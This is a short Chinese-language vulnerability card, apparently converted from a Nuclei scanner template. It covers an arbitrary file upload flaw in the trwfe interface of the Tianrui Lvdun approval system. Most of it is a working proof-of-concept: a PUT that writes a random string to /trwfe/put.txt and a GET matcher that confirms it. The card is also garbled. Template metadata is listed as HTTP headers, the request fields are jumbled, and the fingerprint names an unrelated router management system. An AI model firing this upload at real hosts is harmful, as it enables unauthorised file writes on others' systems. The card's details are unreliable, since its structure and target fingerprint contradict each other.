# 天锐绿盾审批系统trwfe接口任意文件上传漏洞

- **系统**：天锐绿盾　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title = ZSRV2路由器Web管理系统`
- **请求**：`PUT /trwfe/put.txt HTTP/1.1`
- **关键头**：`Priority: u=0, i`　`id: trwfe-uploadfile-vul`　`name: trwfe-uploadfile-vul`　`author: KT`　`severity: high`

**请求体 / payload**
```
123123
上传定位：/trwfe/put.txt
- raw:
-
Host: {{Hostname}}
Priority: u=0, i
{{randstr}}
-
GET /trwfe/put.txt HTTP/1.1
Host: {{Hostname}}
matchers:
- type: dsl
dsl:
- status_code==200 && contains_all(body,"{{randstr}}")
```
- **预期**：200　|　—